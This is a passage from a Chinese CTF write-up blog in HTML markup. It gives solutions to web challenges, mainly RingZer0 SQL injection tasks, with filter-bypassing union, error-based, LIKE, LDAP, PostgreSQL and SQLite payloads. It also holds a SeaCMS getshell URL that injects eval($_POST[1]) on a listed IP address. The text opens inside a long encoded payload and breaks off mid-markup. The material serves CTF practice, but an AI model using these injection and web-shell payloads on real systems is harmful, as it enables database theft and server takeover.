class="hljs-meta">%</span>EFe<span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>B<span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span>FBe<span class="hljs-meta">%</span><span class="hljs-number">05</span><span class="hljs-meta">%</span>F<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>e<span class="hljs-meta">%</span><span class="hljs-number">1</span>B<span class="hljs-meta">%</span>E<span class="hljs-number">5</span><span class="hljs-meta">%</span>E<span class="hljs-number">6</span><span class="hljs-meta">%</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">15</span><span class="hljs-meta">%</span>A<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>E<span class="hljs-meta">%</span><span class="hljs-number">25</span><span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>EE<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span>EC<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span><span class="hljs-number">02</span>r<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span>A<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>E<span class="hljs-meta">%</span><span class="hljs-number">16</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>E<span class="hljs-meta">%</span><span class="hljs-number">24</span><span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span><span class="hljs-number">28</span>i<span class="hljs-meta">%</span><span class="hljs-number">0</span>Fq<span class="hljs-meta">%</span>B<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">11</span>k<span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span><span class="hljs-number">92</span><span class="hljs-meta">%</span>A<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>FC<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span>AC<span class="hljs-meta">%</span>EE<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>EFG-Q<span class="hljs-meta">%</span><span class="hljs-number">25</span><span class="hljs-meta">%</span>CF&amp;para<span class="hljs-name">m2</span>=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">232</span><span class="hljs-meta">%</span><span class="hljs-number">9</span>C<span class="hljs-meta">%</span><span class="hljs-number">21</span><span class="hljs-meta">%</span>F<span class="hljs-number">4</span><span class="hljs-meta">%</span>A<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">17</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span>CF<span class="hljs-meta">%</span>BF<span class="hljs-meta">%</span><span class="hljs-number">90</span><span class="hljs-meta">%</span>A<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">08</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>Al<span class="hljs-meta">%</span><span class="hljs-number">15</span>O<span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span><span class="hljs-number">9</span>C<span class="hljs-meta">%</span><span class="hljs-number">1</span>CS<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>F<span class="hljs-meta">%</span>BAx<span class="hljs-meta">%</span>C<span class="hljs-number">6</span>J<span class="hljs-meta">%</span>FA<span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span>EF<span class="hljs-meta">%</span>F<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span>CC<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span>CB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span><span class="hljs-number">24</span>p<span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>Ah<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">10</span>H<span class="hljs-meta">%</span>E<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">9</span>C<span class="hljs-meta">%</span><span class="hljs-number">29</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>E<span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>BB<span class="hljs-meta">%</span><span class="hljs-number">0</span>CJ<span class="hljs-meta">%</span>AE<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span>B<span class="hljs-number">9</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span>C<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>E<span class="hljs-number">6</span>g<span class="hljs-meta">%</span>EFe<span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>B<span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span>FBe<span class="hljs-meta">%</span><span class="hljs-number">05</span><span class="hljs-meta">%</span>F<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>e<span class="hljs-meta">%</span><span class="hljs-number">1</span>B<span class="hljs-meta">%</span>E<span class="hljs-number">5</span><span class="hljs-meta">%</span>E<span class="hljs-number">6</span><span class="hljs-meta">%</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">91</span><span class="hljs-meta">%</span><span class="hljs-number">15</span><span class="hljs-meta">%</span>A<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>E<span class="hljs-meta">%</span><span class="hljs-number">25</span><span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>EE<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span>EC<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span><span class="hljs-number">02</span>r<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span>A<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>E<span class="hljs-meta">%</span><span class="hljs-number">16</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>E<span class="hljs-meta">%</span><span class="hljs-number">24</span><span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span><span class="hljs-number">28</span>i<span class="hljs-meta">%</span><span class="hljs-number">0</span>Fq<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">11</span>k<span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span><span class="hljs-number">92</span><span class="hljs-meta">%</span>A<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>FC<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span>AC<span class="hljs-meta">%</span>EE<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>EF<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>-Q<span class="hljs-meta">%</span><span class="hljs-number">25</span><span class="hljs-meta">%</span>CF</code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x13冈村宁次"><a href="#0x13冈村宁次" class="headerlink" title="0x13冈村宁次"></a>0x13冈村宁次</h1><p>发现过滤<code>or union select = 空格</code><br>构造payload</p><pre><code class="hljs n1ql">尝试查询database-1<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>seselectlect<span class="hljs-comment">/**/</span>NULL,NULL,database(),NULL,NULL,NULL=wETV5ELMxUVOxCTMVlTskCKlNXYiFGdhRGLMxUVOxCTMVlTvoiKvQ3YlxGdjVGblNXZz9iKq8ibvlmbu9WauVXdvoiKvETLDatabase: ctf_sql爆表名&lt;?php echo strrev(base64_encode("0<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>sselectelect<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>((sselectelect<span class="hljs-comment">/**/</span>database())a<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>2)b<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>3)c<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>4)d<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>5)e<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema<span class="hljs-comment">/**/</span>like<span class="hljs-comment">/**/</span>database())f)"));pYWKpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SKl1WYu9VZsJWY0hCdhNmbvN2XwV3byd2LqoyL0NWZsVGdjVGblN3co8iKq8ibp9mavoiKvUWK18iKq8CdjVGblR3YlxWZzNHKvoiKv4Wavp2LqoyLklCNvoiKvQ3YlxWZ0NWZsV2czhyLqoyLul2bq9iKq8yYpMzLqoyL0NWZsVGdjVGblN3co8iKq8ibp9mavoiKvIWKy8iKq8CdjVGblR3YlxWZzNHKvoiKv4Wavp2LqoyLhlSKoU2chJWY0FGZvoiKvQ3YlxWZ0NWZsV2czhCKvoiKv02byZ2LqoyLq8iKq8CdjVGblR3YlxWZzN3LqoyLu9Wau52bp5Wd19iKq8CM爆flag字段echo strrev(base64_encode("0<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>sselectelect<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>((sselectelect<span class="hljs-comment">/**/</span>database())a<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>2)b<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>3)c<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>4)d<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>5)e<span class="hljs-comment">/**/</span>join<span class="hljs-comment">/**/</span>(sselectelect<span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>flag)f)"));</code></pre><h1 id="0x14-作战计划"><a href="#0x14-作战计划" class="headerlink" title="0x14 作战计划"></a>0x14 作战计划</h1><p>参考文章：<code>https://blog.csdn.net/zhhy7788/article/details/80151379</code><br>使用Seacms漏洞getshell<br>Payload如下<br><code>http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code><br>根目录下发现flag文件<br><code>flag{!!seacms_@@}</code></p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x15-池步洲"><a href="#0x15-池步洲" class="headerlink" title="0x15 池步洲"></a>0x15 池步洲</h1><p>后端源码泄露<code>index.phps</code></p><p>Payload:<code>name[]=1&amp;password[]=2</code></p><p><code>flag{Y0u_just_br0ke_sha1}</code><br><img src="./9.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RingZer0_CTF_web-sql WP</title>
    <link href="/2019/04/06/RingZer0-CTF-web-sql-WP/"/>
    <url>/2019/04/06/RingZer0-CTF-web-sql-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>sql Injection训练地址<a href="https://ringzer0ctf.com/challenges" target="_blank" rel="noopener">https://ringzer0ctf.com/challenges</a></p><h1 id="Challenge-1-Bypass-me-if-you-can-（万能密码）"><a href="#Challenge-1-Bypass-me-if-you-can-（万能密码）" class="headerlink" title="Challenge 1 Bypass me if you can （万能密码）"></a>Challenge 1 Bypass me if you can （万能密码）</h1><p>尝试 </p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin’<span class="hljs-meta">#</span><span class="hljs-symbol">password:</span><span class="hljs-number">1</span></code></pre><p><img src="./1.png" srcset="/img/loading.gif" alt=""> </p><h1 id="Challenge-Access-list-（报错-联合）"><a href="#Challenge-Access-list-（报错-联合）" class="headerlink" title="Challenge Access list （报错+联合）"></a>Challenge Access list （报错+联合）</h1><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p><strong>引号报错，使用报错注入</strong></p><pre><code class="hljs http">username=admin' and extractvalue(1,concat(0x7e,(select database()),0x7e))#XPATH syntax error: '~chal2~'表名字username=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='chal2'),0x7e))#XPATH syntax error: '~c2_group,c2_group_membership,c2'username=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='c2_group_membership'),0x7e))#XPATH syntax error: '~id,usernameid,groupnameid~'username=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='c2_group'),0x7e))#XPATH syntax error: '~id,groupname,description~'username=admin' union select 1,2,group_concat(description) from c2_group#<span class="hljs-attribute">Administrateurs,Users,FLAG-sdfoip340e89rfuj34woit</span></code></pre><h1 id="Login-portal-1-like注入"><a href="#Login-portal-1-like注入" class="headerlink" title="Login portal 1(like注入)"></a>Login portal 1(like注入)</h1><pre><code class="hljs routeros">Paload:<span class="hljs-attribute">username</span>=admin <span class="hljs-string">'%20or%20username%20like%20'</span>%&amp;<span class="hljs-attribute">password</span>=123<span class="hljs-attribute">username</span>=admin'  <span class="hljs-keyword">or</span> 1 like <span class="hljs-string">'1&amp;password=123</span></code></pre><p>%换成_也是ok</p><p><code>FLAG-4f885o1dal0q1huj6eaxuatcvn</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h1 id="Random-Login-Form（长度截断）"><a href="#Random-Login-Form（长度截断）" class="headerlink" title="Random Login Form（长度截断）"></a>Random Login Form（长度截断）</h1><p>判断是二次注入但是字符无论输出输入都被转义<br>使用长度截断<br>注册：</p><pre><code class="hljs angelscript">Username:admin                                   <span class="hljs-number">1</span>Password:<span class="hljs-number">1</span></code></pre><p>登录</p><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span>admin<span class="hljs-symbol">Password:</span><span class="hljs-number">1</span></code></pre><p><code>FLAG-0Kg64o8M9gPQfH45583Mc0jc3u</code></p><h1 id="Just-another-login-form-LDAP注入"><a href="#Just-another-login-form-LDAP注入" class="headerlink" title="Just another login form (LDAP注入)"></a>Just another login form (LDAP注入)</h1><pre><code class="hljs sql">Username:admin' union <span class="hljs-keyword">select</span> <span class="hljs-keyword">sha1</span>(<span class="hljs-number">1</span>),<span class="hljs-keyword">sha1</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><span class="hljs-keyword">Password</span>:<span class="hljs-number">1</span></code></pre><p>提示:Bad search filter<br>LDAP注入</p><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span>*<span class="hljs-symbol">Password:</span>*</code></pre><p><code>FLAG-38i65201RR4B5g1oAm05fHO0QP</code></p><h1 id="Po-po-po-po-postgresql-postgresql注入"><a href="#Po-po-po-po-postgresql-postgresql注入" class="headerlink" title="Po po po po postgresql (postgresql注入)"></a>Po po po po postgresql (postgresql注入)</h1><p>Select * from users where (username=(‘’) and password=(’’))</p><p>尝试: <code>admin’ or ‘a’ like ‘a’</code></p><p><code>ERROR: syntax error at or near &quot;27e1&quot; LINE 1: ...me = (&#39;admin&#39; or &#39;a&#39; like &#39;a&#39;&#39;) AND password = (&#39;27e1fc1258... ^</code></p><p>注入</p><pre><code class="hljs vbnet">username=admin<span class="hljs-comment">') or 'a' like 'a') -- &amp;password=1</span>username=admin<span class="hljs-comment">')) or 'a' like 'a' -- &amp;password=1</span><span class="hljs-comment">')) OR TRUE --</span></code></pre><p><code>FLAG-mdeq68jNN88xLB1o2m8V33Ld</code><br>注意postsql中where子句只能用string值</p><h1 id="Login-form-Don’t-mess-with-Noemie（POST注入）"><a href="#Login-form-Don’t-mess-with-Noemie（POST注入）" class="headerlink" title="Login form | Don’t mess with Noemie（POST注入）"></a>Login form | Don’t mess with Noemie（POST注入）</h1><p>尝试:<code>1’ or ‘a’ like ‘a</code><br>登入失败<br>猜测语句为 <code>select * from users where username=’xx’ and password=’xxx’</code></p><p>使用语句：<code>&#39; or 1  or &#39;</code></p><p><code>&#39; UNION SELECT 1,2&#39;</code></p><p><code>FLAG-Yk3Hfovvb5kALU9hI2545MaY</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="What’s-the-definition-of-NULL-（sqlite联合注入）"><a href="#What’s-the-definition-of-NULL-（sqlite联合注入）" class="headerlink" title="What’s the definition of NULL （sqlite联合注入）"></a>What’s the definition of NULL （sqlite联合注入）</h1><pre><code class="hljs sql">?id=LTEpIFVOSU9OIEFMTCBTRUxFQ1QgbmFtZSxOVUxMLE5VTEwgRlJPTSBzcWxpdGVfbWFzdGVyIFdIRVJFIHR5cGU9InRhYmxlIi0tPlain:-1) UNION ALL <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span> <span class="hljs-keyword">FROM</span> sqlite_master <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"table"</span><span class="hljs-comment">--</span><span class="hljs-keyword">Result</span>:FlagThe <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">rows</span>:?<span class="hljs-keyword">id</span>=LTEpIFVOSU9OIEFMTCBTRUxFQ1QgQ09VTlQoKiksTlVMTCxOVUxMIGZyb20gZmxhZy0tPlain:<span class="hljs-number">-1</span>) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">COUNT</span>(*),<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span> <span class="hljs-keyword">from</span> flag<span class="hljs-comment">--</span><span class="hljs-keyword">Result</span>: <span class="hljs-number">2</span>The flag:?<span class="hljs-keyword">id</span>=LTEpIFVOSU9OIEFMTCBTRUxFQ1QgKiBmcm9tIGZsYWcgTElNSVQgMSBPRkZTRVQgMS0t  Plain: <span class="hljs-number">-1</span>) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">OFFSET</span> <span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-keyword">Result</span>: FLAG-sQFYzqfxbZhAj04NyCCV8tqA</code></pre><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="Login-portal-2-（sha1注入）"><a href="#Login-portal-2-（sha1注入）" class="headerlink" title="Login portal 2 （sha1注入）"></a>Login portal 2 （sha1注入）</h1><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span><span class="hljs-number">1</span>’ <span class="hljs-keyword">or</span> username like “%”<span class="hljs-meta">#</span><span class="hljs-symbol">Password:</span><span class="hljs-number">1</span></code></pre><p>可得username为impossibletoguess<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>使用联合注入</p><pre><code class="hljs sql">Input username: 1' union <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span><span class="hljs-comment">#              </span><span class="hljs-keyword">Input</span> <span class="hljs-keyword">password</span>: <span class="hljs-number">1</span></code></pre><p>Database为login2<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs sql">Input username: 1' union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span><span class="hljs-keyword">Input</span> <span class="hljs-keyword">password</span>: <span class="hljs-number">1</span></code></pre><p>表名为users<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs sql">Input username: 1' union <span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span><span class="hljs-comment">#</span><span class="hljs-keyword">Input</span> <span class="hljs-keyword">password</span>: <span class="hljs-number">2</span></code></pre><p>可知password 通过sha1加密<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs sql">Input username: 1' union <span class="hljs-keyword">select</span> <span class="hljs-keyword">sha1</span>(<span class="hljs-number">1</span>),<span class="hljs-keyword">sha1</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><span class="hljs-keyword">Input</span> <span class="hljs-keyword">password</span>: <span class="hljs-number">1</span></code></pre><p>FLAG-wlez73yxtkae9mpr8aerqay7or<br><img src="./11.png" srcset="/img/loading.gif" alt=""><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="Generate-random-quote-GET-过滤空格引号"><a href="#Generate-random-quote-GET-过滤空格引号" class="headerlink" title="Generate random quote (GET,过滤空格引号)"></a>Generate random quote (GET,过滤空格引号)</h1><p>空格被过滤</p><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://ringzer0ctf.com/challenges/<span class="hljs-number">37</span>?q=<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Aunion%<span class="hljs-number">0</span>Aselect%<span class="hljs-number">0</span>A1,database()<span class="hljs-comment">#正常查数据库名字</span>Quote <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> day: No <span class="hljs-literal">one</span> forgives <span class="hljs-keyword">with</span> more grace <span class="hljs-keyword">and</span> love than <span class="hljs-keyword">a</span> child.Quote <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> day: sqli_quote</code></pre><p>查表名字</p><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">37</span>?q=<span class="hljs-number">2</span><span class="hljs-symbol">%0</span>Aunion<span class="hljs-symbol">%0</span>Aselect<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%0</span>agroup_concat(table_name)<span class="hljs-symbol">%0</span>afrom<span class="hljs-symbol">%0</span>ainformation_schema.tables<span class="hljs-symbol">%0</span>awhere<span class="hljs-symbol">%0</span>atable_schema=database())#Quote of the day: No <span class="hljs-keyword">one</span> forgives with more grace <span class="hljs-keyword">and</span> love than a child.Quote of the day: alkdjf<span class="hljs-number">4</span>iu,quotes</code></pre><p>查列名<br>Where语句中能将十六进制自动转换为字符串</p><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">37</span>?q=<span class="hljs-number">2</span><span class="hljs-symbol">%0</span>Aunion<span class="hljs-symbol">%0</span>Aselect<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%0</span>Agroup_concat(column_name)<span class="hljs-symbol">%0</span>Afrom<span class="hljs-symbol">%0</span>Ainformation_schema.columns<span class="hljs-symbol">%0</span>Awhere<span class="hljs-symbol">%0</span>Atable_name=<span class="hljs-number">0x616c6b646a66346975</span>)#Quote of the day: No <span class="hljs-keyword">one</span> forgives with more grace <span class="hljs-keyword">and</span> love than a child.Quote of the day: id,flag</code></pre><p>查flag<br><code>https://ringzer0ctf.com/challenges/37?q=2%0Aunion%0Aselect%0A1,(select%0Agroup_concat(flag)%0Afrom%0Aalkdjf4iu)#</code></p><h1 id="Matrix-Fan-The-only-limits-are-yours（GET，编码引号）"><a href="#Matrix-Fan-The-only-limits-are-yours（GET，编码引号）" class="headerlink" title="Matrix Fan? The only limits are yours（GET，编码引号）"></a>Matrix Fan? The only limits are yours（GET，编码引号）</h1><p>查询所有表</p><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">39</span>/?id=<span class="hljs-number">1</span><span class="hljs-symbol">%20</span>Union<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>NULL,(SELECT<span class="hljs-symbol">%20</span>name<span class="hljs-symbol">%20</span>FROM<span class="hljs-symbol">%20</span>sqlite_master<span class="hljs-symbol">%20</span>WHERE<span class="hljs-symbol">%20</span><span class="hljs-keyword">type</span>=<span class="hljs-symbol">%27</span>table<span class="hljs-symbol">%27</span>)#Limit <span class="hljs-keyword">x</span>,<span class="hljs-number">1</span><span class="hljs-comment">;</span><span class="hljs-comment">random_stuff</span><span class="hljs-comment">ajklshfajks </span><span 